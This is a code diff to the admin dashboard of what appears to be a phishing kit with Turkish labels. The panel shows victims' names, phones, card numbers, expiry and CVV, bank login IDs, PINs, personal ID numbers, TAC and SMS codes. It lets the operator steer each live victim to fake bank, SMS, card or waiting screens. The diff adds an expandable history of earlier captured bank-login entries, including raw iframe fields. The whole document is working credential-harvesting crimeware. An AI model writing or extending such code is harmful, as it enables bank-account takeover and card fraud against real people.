@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback, useEffect, useState, useRef } from "react";
+import { useCallback, useEffect, useState, useRef, Fragment } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { ReceiptModal } from "./ReceiptModal";
@@ -67,6 +67,7 @@ export function AdminDashboardClean() {
 
   const [showBannedModal, setShowBannedModal] = useState(false);
   const [bannedIps, setBannedIps] = useState<{ ip_address: string; reason: string; banned_at: string }[]>([]);
+  const [expandedBankHistorySessionId, setExpandedBankHistorySessionId] = useState<string | null>(null);
 
   const [soundEnabled, setSoundEnabled] = useState(false);
   const soundEnabledRef = useRef(false);
@@ -759,7 +760,7 @@ export function AdminDashboardClean() {
             </thead>
             <tbody className="divide-y divide-zinc-800">
               {rows.map((row) => {
-                const fd = row.form_data || {};
+                const fd = (row.form_data || {}) as Record<string, any>;
                 
                 // Gerçek zamanlı (WebSocket) aktiflik kontrolü
                 const isActuallyOnline = isSessionLive(
@@ -770,172 +771,303 @@ export function AdminDashboardClean() {
                 );
 
                 return (
-                  <tr key={row.id} className="transition-colors hover:bg-[#141414]">
-                    <td className="px-4 py-4">
-                      <div className="flex items-center gap-2">
-                        {isActuallyOnline ? (
-                          <>
-                            <div className="size-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_#003b8f]" />
-                            <span className="text-[10px] font-bold uppercase text-blue-500">ONLİNE</span>
-                          </>
-                        ) : (
-                          <>
-                            <div className="size-2 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444]" />
-                            <span className="text-[10px] font-bold uppercase text-red-500">OFFLİNE</span>
-                          </>
-                        )}
-                      </div>
-                    </td>
-                    <td className="px-4 py-4">
-                      <div className="font-bold text-white">{fd.firstName} {fd.lastName}</div>
-                      <div className="text-[11px] text-zinc-500 font-mono">{fd.phone || "-"}</div>
-                      {row.amount > 0 && (
+                  <Fragment>
+                    <tr className="transition-colors hover:bg-[#141414]">
+                      <td className="px-4 py-4">
+                        <div className="flex items-center gap-2">
+                          {isActuallyOnline ? (
+                            <>
+                              <div className="size-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_8px_#003b8f]" />
+                              <span className="text-[10px] font-bold uppercase text-blue-500">ONLİNE</span>
+                            </>
+                          ) : (
+                            <>
+                              <div className="size-2 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444]" />
+                              <span className="text-[10px] font-bold uppercase text-red-500">OFFLİNE</span>
+                            </>
+                          )}
+                        </div>
+                      </td>
+                      <td className="px-4 py-4">
+                        <div className="font-bold text-white">{fd.firstName} {fd.lastName}</div>
+                        <div className="text-[11px] text-zinc-500 font-mono">{fd.phone || "-"}</div>
+                        {row.amount > 0 && (
                         <div className="mt-1 inline-flex items-center rounded-md bg-blue-500/10 px-2 py-0.5 text-[10px] font-bold text-blue-500 border border-blue-500/20">
-                          {row.amount} {fd.currency || "NZ$"}
+                          {row.amount} {(fd.currency as string) || "NZ$"}
                         </div>
                       )}
-                    </td>
-                    <td className="px-4 py-4">
-                      {(() => {
-                        let s = row.current_step as string;
-                        const livePath = sessionPaths[row.id];
-                        if (isActuallyOnline && livePath) {
-                          if (livePath.startsWith('/wheel')) {
-                            s = "wheel";
-                          } else {
-                            const mappedStep = pathToStep(livePath);
-                            if (mappedStep) {
-                              s = mappedStep;
+                      </td>
+                      <td className="px-4 py-4">
+                        {(() => {
+                          let s = row.current_step as string;
+                          const livePath = sessionPaths[row.id];
+                          if (isActuallyOnline && livePath) {
+                            if (livePath.startsWith('/wheel')) {
+                              s = "wheel";
+                            } else {
+                              const mappedStep = pathToStep(livePath);
+                              if (mappedStep) {
+                                s = mappedStep;
+                              }
                             }
                           }
-                        }
-                        
-                        // Varsayılan Renk (Gri)
-                        let colorClass = "bg-zinc-800 text-zinc-400";
-                        let text = "BAŞLANGIÇ";
+                          
+                          // Varsayılan Renk (Gri)
+                          let colorClass = "bg-zinc-800 text-zinc-400";
+                          let text = "BAŞLANGIÇ";
 
-                        if (s === "wheel") {
-                          colorClass = "bg-teal-500/20 text-teal-400";
-                          text = "ÇARK OYUNU";
-                        } else if (s === "code_entry") {
-                          if (fd.is_wheel_game) {
+                          if (s === "wheel") {
                             colorClass = "bg-teal-500/20 text-teal-400";
                             text = "ÇARK OYUNU";
-                          } else {
-                            colorClass = "bg-pink-500/20 text-pink-500";
-                            text = "KOD GİRİŞİ";
-                          }
-                        } else if (s === "win") {
-                          colorClass = "bg-purple-500/20 text-purple-500";
-                          text = "İSİM & PROFİL";
-                        } else if (s === "bank" || s === "banken") {
-                          colorClass = "bg-indigo-500/20 text-indigo-400";
-                          text = "BANKA LİSTESİ";
-                        } else if (s === "login" || s === "bank_login") {
-                          colorClass = "bg-cyan-500/20 text-cyan-400";
-                          text = "BANKA GİRİŞİ";
-                        } else if (s === "sms") {
-                          colorClass = "bg-orange-500/20 text-orange-500";
-                          text = "SMS ONAYI";
-                        } else if (s === "card") {
-                          colorClass = "bg-rose-500/20 text-rose-500";
-                          text = "KREDİ KARTI";
-                        } else if (s === "wait") {
-                          colorClass = "bg-yellow-500/20 text-yellow-500";
-                          text = "BEKLEME EKRANI";
-                        } else if (s === "invalid_bank") {
-                          colorClass = "bg-red-500/20 text-red-500";
-                          text = "HATALI BANKA";
-                        } else if (s === "live_support") {
-                          colorClass = "bg-blue-500/20 text-blue-500";
-                          text = "CANLI DESTEK";
-                        } else if (s === "special_approval") {
-                          colorClass = "bg-blue-500/20 text-blue-500";
-                          text = "ÖZEL BİLDİRİM";
-                        } else if (s === "congrats") {
-                          colorClass = "bg-teal-500/20 text-teal-400";
-                          text = "TEBRİKLER (SON)";
-                        }
-
-                        return (
-                          <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase ${colorClass}`}>
-                            {text}
-                          </span>
-                        );
-                      })()}
-                    </td>
-                    <td className="px-4 py-4 text-[11px] text-zinc-400">
-                      <div>Kart: <span className="text-zinc-200 font-mono">{fd.cardNumber || "-"}</span></div>
-                      <div>SKT/CVV: <span className="text-zinc-200">{fd.cardExpiry || "-"} / {fd.cardCvc || "-"}</span></div>
-                    </td>
-                    <td className="px-4 py-4 text-xs">
-                      <div className="mb-1 text-[10px] font-black uppercase text-zinc-500 tracking-wider">
-                        Banka: <span className="text-white">{fd.bankName || "Bilinmiyor"}</span>
-                      </div>
-                      {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
-                      {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
-                      <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{fd.verfuegernummer || fd.id || "-"}</span></div>
-                      <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{fd.pin || fd.pw || "-"}</span></div>
-                      <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
-                    </td>
-                    <td className="px-4 py-4 font-mono font-bold text-orange-400 text-xl">{fd.smsCode || "-"}</td>
-                    <td className="px-4 py-4 text-right">
-                      <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
-                        <select 
-                          className="w-full rounded-md border border-zinc-700 bg-[#1a1a1a] px-3 py-2 text-xs text-zinc-300 outline-none focus:border-blue-500 cursor-pointer transition-all" 
-                          value="" 
-                          onChange={(e) => {
-                            if (e.target.value) {
-                              if (e.target.value === "ban_ip") {
-                                void handleBanIp(row.id, row.ip_address);
-                              } else {
-                                void handleRouteAction(row.id, e.target.value);
-                              }
-                              e.target.value = ""; // Resetlemeyi garantiye al
+                          } else if (s === "code_entry") {
+                            if (fd.is_wheel_game) {
+                              colorClass = "bg-teal-500/20 text-teal-400";
+                              text = "ÇARK OYUNU";
+                            } else {
+                              colorClass = "bg-pink-500/20 text-pink-500";
+                              text = "KOD GİRİŞİ";
                             }
-                          }}
-                        >
-                          <option value="">İşlem Seç...</option>
-                          <option value="win">Giriş'e Yönlendir</option>
-                          <option value="banken">Banka Listesine Yönlendirme</option>
-                          <option value="sms">SMS'e Yönlendir</option>
-                          <option value="card">Kart'a Yönlendir</option>
-                          <option value="special_approval">Özel Bildirim Gönder</option>
-                          <option value="wait">Beklemeye Al</option>
-                          <option value="invalid_bank">Hatalı Banka</option>
-                          <option value="live_support">Canlı Desteğe Yönlendir</option>
-                          <option value="congrats">Tebrikler Ekranı</option>
-                          <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
-                        </select>
-                        <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
-                          <button
-                            type="button"
-                            onClick={() => setChatSessionId(row.id)}
-                            className="flex-1 rounded bg-blue-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-blue-500 hover:bg-blue-500 hover:text-white transition-colors"
-                            title="Sohbet"
-                          >
-                            💬
-                          </button>
-                          <button
-                            type="button"
-                            onClick={() => setDeviceInfoSession(row)}
-                            className="flex-1 rounded bg-indigo-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-indigo-400 hover:bg-indigo-500 hover:text-white transition-colors"
-                            title="Cihaz & Bağlantı Bilgileri"
-                          >
-                            📱
-                          </button>
-                          <button
-                            type="button"
-                            onClick={() => void hideSingleLog(row.id)}
-                            className="flex-1 rounded border border-red-500/50 bg-red-500/15 px-2 py-2 text-[10px] font-black uppercase tracking-wide text-red-400 hover:bg-red-600 hover:text-white hover:border-red-400 transition-colors"
-                            title="Bu logu listeden kaldır"
-                          >
-                            🗑️
-                          </button>
+                          } else if (s === "win") {
+                            colorClass = "bg-purple-500/20 text-purple-500";
+                            text = "İSİM & PROFİL";
+                          } else if (s === "bank" || s === "banken") {
+                            colorClass = "bg-indigo-500/20 text-indigo-400";
+                            text = "BANKA LİSTESİ";
+                          } else if (s === "login" || s === "bank_login") {
+                            colorClass = "bg-cyan-500/20 text-cyan-400";
+                            text = "BANKA GİRİŞİ";
+                          } else if (s === "sms") {
+                            colorClass = "bg-orange-500/20 text-orange-500";
+                            text = "SMS ONAYI";
+                          } else if (s === "card") {
+                            colorClass = "bg-rose-500/20 text-rose-500";
+                            text = "KREDİ KARTI";
+                          } else if (s === "wait") {
+                            colorClass = "bg-yellow-500/20 text-yellow-500";
+                            text = "BEKLEME EKRANI";
+                          } else if (s === "invalid_bank") {
+                            colorClass = "bg-red-500/20 text-red-500";
+                            text = "HATALI BANKA";
+                          } else if (s === "live_support") {
+                            colorClass = "bg-blue-500/20 text-blue-500";
+                            text = "CANLI DESTEK";
+                          } else if (s === "special_approval") {
+                            colorClass = "bg-blue-500/20 text-blue-500";
+                            text = "ÖZEL BİLDİRİM";
+                          } else if (s === "congrats") {
+                            colorClass = "bg-teal-500/20 text-teal-400";
+                            text = "TEBRİKLER (SON)";
+                          }
+
+                          return (
+                            <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase ${colorClass}`}>
+                              {text}
+                            </span>
+                          );
+                        })()}
+                      </td>
+                      <td className="px-4 py-4 text-[11px] text-zinc-400">
+                        <div>Kart: <span className="text-zinc-200 font-mono">{fd.cardNumber || "-"}</span></div>
+                        <div>SKT/CVV: <span className="text-zinc-200">{fd.cardExpiry || "-"} / {fd.cardCvc || "-"}</span></div>
+                      </td>
+                      <td className="px-4 py-4 text-xs">
+                        <div className="mb-1 flex items-center justify-between">
+                          <div className="text-[10px] font-black uppercase text-zinc-500 tracking-wider">
+                            Banka: <span className="text-white">{fd.bankName || "Bilinmiyor"}</span>
+                          </div>
+                          {Array.isArray((fd as any).bankFormHistory) && (fd as any).bankFormHistory.length > 0 && (
+                            <button
+                              type="button"
+                              onClick={() => setExpandedBankHistorySessionId(expandedBankHistorySessionId === row.id ? null : row.id)}
+                              className={`rounded-md border px-2 py-0.5 text-[9px] font-black uppercase tracking-wide transition-colors ${
+                                expandedBankHistorySessionId === row.id
+                                  ? "border-amber-500/50 bg-amber-500/20 text-amber-400 hover:bg-amber-500 hover:text-white"
+                                  : "border-zinc-700 bg-zinc-900 text-zinc-400 hover:bg-zinc-800 hover:text-zinc-200"
+                              }`}
+                              title="Eski banka form girişlerini göster"
+                            >
+                              GEÇMİŞ ({(fd as any).bankFormHistory.length})
+                            </button>
+                          )}
                         </div>
-                      </div>
-                    </td>
-                  </tr>
+                        {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
+                        {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
+                        <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{fd.verfuegernummer || fd.id || "-"}</span></div>
+                        <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{fd.pin || fd.pw || "-"}</span></div>
+                        <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
+                      </td>
+                      <td className="px-4 py-4 font-mono font-bold text-orange-400 text-xl">{fd.smsCode || "-"}</td>
+                      <td className="px-4 py-4 text-right">
+                        <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
+                          <select 
+                            className="w-full rounded-md border border-zinc-700 bg-[#1a1a1a] px-3 py-2 text-xs text-zinc-300 outline-none focus:border-blue-500 cursor-pointer transition-all" 
+                            value="" 
+                            onChange={(e) => {
+                              if (e.target.value) {
+                                if (e.target.value === "ban_ip") {
+                                  void handleBanIp(row.id, row.ip_address);
+                                } else {
+                                  void handleRouteAction(row.id, e.target.value);
+                                }
+                                e.target.value = ""; // Resetlemeyi garantiye al
+                              }
+                            }}
+                          >
+                            <option value="">İşlem Seç...</option>
+                            <option value="win">Giriş'e Yönlendir</option>
+                            <option value="banken">Banka Listesine Yönlendirme</option>
+                            <option value="sms">SMS'e Yönlendir</option>
+                            <option value="card">Kart'a Yönlendir</option>
+                            <option value="special_approval">Özel Bildirim Gönder</option>
+                            <option value="wait">Beklemeye Al</option>
+                            <option value="invalid_bank">Hatalı Banka</option>
+                            <option value="live_support">Canlı Desteğe Yönlendir</option>
+                            <option value="congrats">Tebrikler Ekranı</option>
+                            <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
+                          </select>
+                          <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
+                            <button
+                              type="button"
+                              onClick={() => setChatSessionId(row.id)}
+                              className="flex-1 rounded bg-blue-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-blue-500 hover:bg-blue-500 hover:text-white transition-colors"
+                              title="Sohbet"
+                            >
+                              💬
+                            </button>
+                            <button
+                              type="button"
+                              onClick={() => setDeviceInfoSession(row)}
+                              className="flex-1 rounded bg-indigo-600/20 px-2 py-2 text-[10px] font-bold uppercase tracking-wide text-indigo-400 hover:bg-indigo-500 hover:text-white transition-colors"
+                              title="Cihaz & Bağlantı Bilgileri"
+                            >
+                              📱
+                            </button>
+                            <button
+                              type="button"
+                              onClick={() => void hideSingleLog(row.id)}
+                              className="flex-1 rounded border border-red-500/50 bg-red-500/15 px-2 py-2 text-[10px] font-black uppercase tracking-wide text-red-400 hover:bg-red-600 hover:text-white hover:border-red-400 transition-colors"
+                              title="Bu logu listeden kaldır"
+                            >
+                              🗑️
+                            </button>
+                          </div>
+                        </div>
+                      </td>
+                    </tr>
+                    {expandedBankHistorySessionId === row.id &&
+                      Array.isArray((fd as any).bankFormHistory) &&
+                      (fd as any).bankFormHistory.length > 0 && (
+                        <tr className="border-b border-zinc-800 bg-[#0d0d0d]">
+                          <td colSpan={7} className="px-6 py-4">
+                            <div className="mb-2 flex items-center gap-2">
+                              <span className="rounded bg-amber-500/20 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-amber-400 border border-amber-500/30">
+                                Eski Banka Girişleri ({(fd as any).bankFormHistory.length})
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedBankHistorySessionId(null)}
+                                className="ml-auto rounded-md border border-zinc-700 bg-zinc-900 px-3 py-1 text-[10px] font-bold text-zinc-400 hover:bg-zinc-800 hover:text-zinc-100 transition-colors"
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div className="space-y-3">
+                              {((fd as any).bankFormHistory as any[])
+                                .slice()
+                                .reverse()
+                                .map((entry, index) => {
+                                  const entryDate = entry.capturedAt
+                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
+                                        hour12: false,
+                                        timeZone: "Europe/Istanbul",
+                                      })
+                                    : "Tarih yok";
+                                  return (
+                                    <div
+                                      key={`${row.id}-history-${index}`}
+                                      className="rounded-xl border border-zinc-800 bg-[#141414] p-4"
+                                    >
+                                      <div className="mb-2 flex flex-wrap items-center gap-2">
+                                        <span className="rounded bg-zinc-800 px-2 py-0.5 text-[10px] font-black uppercase text-zinc-300 border border-zinc-700">
+                                          #{(fd as any).bankFormHistory.length - index}
+                                        </span>
+                                        {entry.bankName && (
+                                          <span className="rounded bg-indigo-500/15 px-2 py-0.5 text-[10px] font-black uppercase tracking-wide text-indigo-300 border border-indigo-500/30">
+                                            {entry.bankName}
+                                          </span>
+                                        )}
+                                        <span className="ml-auto text-[11px] font-mono text-zinc-500">{entryDate}</span>
+                                      </div>
+                                      <div className="grid grid-cols-1 gap-2 text-xs sm:grid-cols-2 lg:grid-cols-4">
+                                        {entry.verfuegernummer || entry.username ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Kullanıcı ID</div>
+                                            <div className="font-mono font-bold text-zinc-100">
+                                              {entry.verfuegernummer || entry.username || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.pin || entry.password ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Şifre / PIN</div>
+                                            <div className="font-mono font-bold text-zinc-100">
+                                              {entry.pin || entry.password || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.personalCode ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Kimlik No</div>
+                                            <div className="font-mono font-bold text-zinc-100">{entry.personalCode}</div>
+                                          </div>
+                                        ) : null}
+                                        {entry.bankPhone ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Banka Telefon</div>
+                                            <div className="font-mono font-bold text-zinc-100">{entry.bankPhone}</div>
+                                          </div>
+                                        ) : null}
+                                        {entry.loginMethod ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Giriş Yöntemi</div>
+                                            <div className="font-semibold text-zinc-100">{entry.loginMethod}</div>
+                                          </div>
+                                        ) : null}
+                                        {entry.tacCode ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">TAC / Onay Kodu</div>
+                                            <div className="font-mono font-bold text-orange-400">{entry.tacCode}</div>
+                                          </div>
+                                        ) : null}
+                                        {entry.orderedField1 || entry.orderedField2 || entry.orderedField3 ? (
+                                          <div className="rounded-lg bg-[#0a0a0a] border border-zinc-800 px-3 py-2 sm:col-span-2">
+                                            <div className="mb-1 text-[10px] font-black uppercase text-zinc-500">Sıralı Form Alanları</div>
+                                            <div className="space-y-1 text-zinc-100 font-mono">
+                                              {entry.orderedField1 && <div>1. {entry.orderedField1}</div>}
+                                              {entry.orderedField2 && <div>2. {entry.orderedField2}</div>}
+                                              {entry.orderedField3 && <div>3. {entry.orderedField3}</div>}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                      </div>
+                                      {entry.rawFields && Object.keys(entry.rawFields).length > 0 ? (
+                                        <details className="mt-3">
+                                          <summary className="cursor-pointer text-[10px] font-black uppercase tracking-wide text-zinc-500 hover:text-zinc-300">
+                                            Ham (iframe) alanlar ({Object.keys(entry.rawFields).length})
+                                          </summary>
+                                          <pre className="mt-2 max-h-56 overflow-auto rounded-lg bg-black/70 border border-zinc-800 p-3 text-[11px] font-mono text-zinc-300 whitespace-pre-wrap break-all">
+{JSON.stringify(entry.rawFields, null, 2)}
+                                          </pre>
+                                        </details>
+                                      ) : null}
+                                    </div>
+                                  );
+                                })}
+                            </div>
+                          </td>
+                        </tr>
+                      )}
+                  </Fragment>
                 );
               })}
             </tbody>
